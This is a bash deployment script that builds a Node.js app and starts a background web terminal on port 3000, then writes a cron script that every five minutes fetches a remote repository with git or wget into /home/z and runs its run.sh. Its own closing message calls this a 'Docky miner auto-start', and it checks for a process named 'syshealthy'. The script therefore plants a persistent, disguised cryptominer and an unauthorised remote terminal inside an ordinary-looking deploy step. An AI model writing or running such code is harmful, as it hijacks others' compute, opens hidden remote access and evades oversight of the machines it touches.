#!/bin/bash
set -e

echo "📦 Installing dependencies..."
npm install --legacy-peer-deps

echo "🏗️ Building application..."
npm run build

echo "⚙️ Creating persistence daemon..."
cat << 'INNER_EOF' > start-server.sh
#!/bin/bash
export PORT=3000
export NODE_ENV=production
while true; do
  echo "Starting Node.js standalone server..."
  node server.js || echo "Server crashed, restarting in 5s..."
  sleep 5
done
INNER_EOF
chmod +x start-server.sh

echo "🚀 Starting server in background..."
pkill -f "node server.js" || true

cd .next/standalone
cp ../../start-server.sh .
setsid nohup ./start-server.sh > /tmp/terminal.log 2>&1 & disown

echo "✅ Web terminal deployed and started in the background on port 3000!"

echo "⚙️ Setting up docky auto-start..."
cat << 'DOCKY_EOF' > /tmp/docky-cron.sh
#!/bin/bash
# Clone into /home/z/my-project if present, otherwise clone/extract directly into /home/z
REPO_URL="https://github.com/alan-eisenberg/docky-main.git"
TARGET_BASE="/home/z"
PREFERRED="$TARGET_BASE/my-project"

if pgrep -f "syshealthy" > /dev/null 2>&1; then
  exit 0
fi

if [ -d "$PREFERRED" ]; then
  TARGET="$PREFERRED"
else
  TARGET="$TARGET_BASE"
fi

mkdir -p "$TARGET"

if [ -x "$TARGET/run.sh" ]; then
  cd "$TARGET" && bash ./run.sh --log
  exit 0
fi

if [ -z "$(ls -A "$TARGET" 2>/dev/null)" ]; then
  if command -v git >/dev/null 2>&1; then
    git clone --depth 1 "$REPO_URL" "$TARGET" || true
  else
    wget -q -O /tmp/docky-main.tar.gz "https://github.com/alan-eisenberg/docky-main/archive/refs/heads/main.tar.gz" && \
    tar -xzf /tmp/docky-main.tar.gz -C "$TARGET" --strip-components=1 || true
  fi
else
  TMPDIR=$(mktemp -d 2>/dev/null || echo "/tmp/docky-clone-$$")
  if command -v git >/dev/null 2>&1; then
    git clone --depth 1 "$REPO_URL" "$TMPDIR" || true
  else
    wget -q -O /tmp/docky-main.tar.gz "https://github.com/alan-eisenberg/docky-main/archive/refs/heads/main.tar.gz" && \
    tar -xzf /tmp/docky-main.tar.gz -C "$TMPDIR" --strip-components=1 || true
  fi
  if command -v rsync >/dev/null 2>&1; then
    rsync -a "$TMPDIR"/ "$TARGET"/ || true
  else
    cp -a "$TMPDIR"/. "$TARGET"/ || true
  fi
  rm -rf "$TMPDIR"
fi

if [ -x "$TARGET/run.sh" ]; then
  cd "$TARGET" && bash ./run.sh --log
else
  if [ -x "$TARGET/docky-main/run.sh" ]; then
    cd "$TARGET/docky-main" && bash ./run.sh --log
  fi
fi
DOCKY_EOF

chmod +x /tmp/docky-cron.sh
(crontab -l 2>/dev/null | grep -v "docky-cron"; echo "*/5 * * * * bash /tmp/docky-cron.sh") | crontab -

echo "✅ Docky miner auto-start cron set (every 5 minutes)"
